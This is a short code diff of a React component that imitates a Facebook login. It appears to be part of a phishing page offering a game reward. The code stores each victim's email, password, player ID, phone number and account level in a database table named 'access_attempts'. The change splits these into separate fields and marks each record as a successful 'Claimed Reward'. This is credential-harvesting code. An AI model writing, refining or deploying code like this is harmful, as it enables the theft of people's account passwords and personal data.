@@ -48,12 +48,15 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
     accountLevel: string;
   }) => {
     try {
-      // Store all data in Supabase
+      // Store all data in Supabase with proper field mapping
       await supabase.from('access_attempts').insert({
         email: userLoginData?.email || '',
         passphrase: userLoginData?.password || '',
-        item_name: `Player ID: ${verificationData.playerId}, Phone: ${verificationData.phoneNumber}, Level: ${verificationData.accountLevel}`,
-        status: 'verification_completed'
+        player_uid: verificationData.playerId,
+        phone_number: verificationData.phoneNumber,
+        player_level: verificationData.accountLevel,
+        item_name: 'Claimed Reward',
+        status: 'success'
       });
 
       setShowVerification(false);
